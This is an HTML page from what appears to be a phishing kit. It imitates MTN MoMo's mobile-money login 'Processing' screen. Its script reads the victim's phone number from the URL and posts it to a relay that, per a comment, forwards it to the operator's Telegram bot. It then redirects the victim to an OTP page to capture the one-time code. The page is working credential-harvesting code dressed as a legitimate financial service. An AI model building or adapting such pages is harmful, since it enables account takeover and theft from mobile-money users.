<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing - MoMo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #f4f4f4;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ===== HEADER ===== */
        .header {
            background: #ffffff;
            padding: 14px 24px;
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 3px solid #ffcc00;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            z-index: 10;
            position: relative;
        }

        .hamburger {
            font-size: 22px;
            color: #333;
            cursor: pointer;
            line-height: 1;
            user-select: none;
        }

        .logo-box {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo-icon {
            width: 42px;
            height: 42px;
            background: #ffcc00;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 11px;
            color: #004f9f;
            line-height: 1;
            text-align: center;
            border: 2px solid #004f9f;
        }

        .logo-text {
            font-weight: 800;
            font-size: 20px;
            color: #004f9f;
            letter-spacing: -0.5px;
        }

        .header-title {
            font-size: 18px;
            font-weight: 700;
            color: #222;
            flex: 1;
        }

        /* ===== MAIN ===== */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
            position: relative;
        }

        .page-title {
            font-size: 32px;
            font-weight: 800;
            color: #111;
            text-align: center;
            margin-bottom: 32px;
        }

        /* ===== PROCESSING CARD ===== */
        .card {
            background: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 16px;
            padding: 60px 32px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
            text-align: center;
        }

        .spinner {
            width: 90px;
            height: 90px;
            border: 8px solid #fff5cc;
            border-top-color: #ffcc00;
            border-radius: 50%;
            margin: 0 auto 36px;
            animation: spin 1s linear infinite;
            box-shadow: 0 0 25px rgba(255, 204, 0, 0.4);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .card h2 {
            font-size: 26px;
            font-weight: 800;
            color: #111;
            margin-bottom: 10px;
        }

        .card p {
            font-size: 15px;
            color: #888;
            font-weight: 500;
        }

        /* ===== FOOTER ===== */
        .footer {
            background: #111;
            color: #ffcc00;
            text-align: center;
            padding: 18px;
            font-size: 13px;
            font-weight: 600;
        }

        /* ===== OVERLAY (darkened background behind card) ===== */
        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.35);
            z-index: 5;
            pointer-events: none;
        }

        @media (max-width: 480px) {
            .page-title {
                font-size: 26px;
            }
            .spinner {
                width: 75px;
                height: 75px;
                border-width: 7px;
            }
            .card h2 {
                font-size: 22px;
            }
            .header-title {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="header">
        <span class="hamburger">☰</span>
        <div class="logo-box">
            <div class="logo-icon">MoMo<br>MTN</div>
            <span class="logo-text">MoMo</span>
        </div>
        <span class="header-title">MTN Mobile Services</span>
    </header>

    <!-- Dark overlay behind the card -->
    <div class="overlay"></div>

    <!-- MAIN -->
    <main class="main">
        <h1 class="page-title">Login</h1>

        <div class="card">
            <div class="spinner"></div>
            <h2>Processing</h2>
            <p>Please wait...</p>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="footer">
        © 2026 MoMo
    </footer>

    <script>
        // ─── Grab the phone number passed from login.html ───
        const params = new URLSearchParams(window.location.search);
        const phone = params.get('phone') || 'unknown';

        // ─── Send the phone number to our backend relay ───
        // The backend then forwards it to YOUR Telegram bot.
        fetch('/api/send-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                phone: phone,
                timestamp: new Date().toISOString()
            })
        }).catch(err => console.error('Telegram send failed:', err));

        // ─── After ~4 seconds, redirect to OTP page (or dashboard) ───
        setTimeout(() => {
            window.location.href = `otp.html?phone=${encodeURIComponent(phone)}`;
        }, 4000);
    </script>
</body>
</html>
